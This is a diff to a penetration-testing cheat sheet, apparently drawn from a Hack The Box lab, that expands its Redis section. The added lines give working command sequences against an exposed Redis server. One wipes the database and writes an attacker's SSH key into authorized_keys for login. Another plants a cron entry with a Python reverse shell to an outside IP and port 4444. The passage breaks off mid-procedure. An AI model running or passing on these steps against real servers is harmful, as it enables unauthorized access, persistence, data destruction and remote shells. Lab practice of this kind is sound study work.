@@ -47,7 +47,7 @@
  - [Python virtual environment](#python-virtual-environment)
  - [Specific user file permission](#specific-permission-for-specific-user)
  - [SMB enumeration](#smb-enumeration)
- - [Redis RCE](#redis-rce)
+ - [Redis](#redis)
 ### Windows
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
 - [SMB enumeration](#windows-smb-enumeration)
@@ -1009,9 +1009,36 @@ map - Brute Force Accounts (be aware of account lockout!)
 ```
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
 ```
-### Redis RCE
+### Redis
+
+* SSH
 ```
-root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
+kali@bughunt3r:~/htb/machines/postman$ echo "FLUSHALL" | redis-cli -h 10.10.10.160
+OK                                                                                                        
+kali@bughunt3r:~/htb/machines/postman$ cat ~/.ssh/id_rsa.pub | redis-cli -h 10.10.10.160 -x set s-key
+OK                               
+kali@bughunt3r:~/htb/machines/postman$ redis-cli -h 10.10.10.160
+10.10.10.160:6379> get s-key
+"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCq3RrdjDR90IQ6XDWbrC3z+kC5nwMJjqQwVkL376u/efZONVcKUmMh/7dBNCftrxswyR+o3MMXEp4LlC2vfCh0HVcBW3b+W/AJDxygO0nYNNhF/jyQhqpF8+lG5EVloVxj8mYEalHhJwapiJeomEoqi5x9K9KWQb5eVu8U7sgjMgjf6taloWmAnPY+Ev3C5zwweJB9/Pwe+IO2i7lis1EjGxUMDOZq+A+x+l7wjHfb167GWuPTo47o4/1NNyVZ7kBB4iHKoIFojRtpCDfUuWVFKz9OyWnUWsnXeWxTbMVy8vJO9SsYlPfi34djEB1R0g7nzeJvLmdjvzsJMiXl85nq2vdldpfzvONtyh4fYSEL5ZfBPhMZ7wpXsHVy3u2S8SJ51SfTQQe6FUsPzkThGU/ps6DHZH4ucuS+4U07vPgxgDlAL4+jWLjYhWsybMss8HOXvaTVErmgCSeSvs0nxYRZsAfZfzcG0pvEGIO6wvxRdwO2XRedBZmmIgwvP4Rb6b8= kali@bughunt3r\n"
+10.10.10.160:6379> config set dir /var/lib/redis/.ssh
+OK
+10.10.10.160:6379> config set dbfilename authorized_keys
+OK
+10.10.10.160:6379> config get dbfilename
+1) "dbfilename"
+2) "authorized_keys"
+10.10.10.160:6379> save
+OK
+
+```
+```
+ssh -i ~/.ssh/id_rsa redis@10.10.10.160
+```
+
+
+* `RCE`
+```
+root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.10.10.160 -x set 1
 OK
 root@Urahara:~# redis-cli -h 10.10.10.160 config set dir /var/spool/cron/
 OK
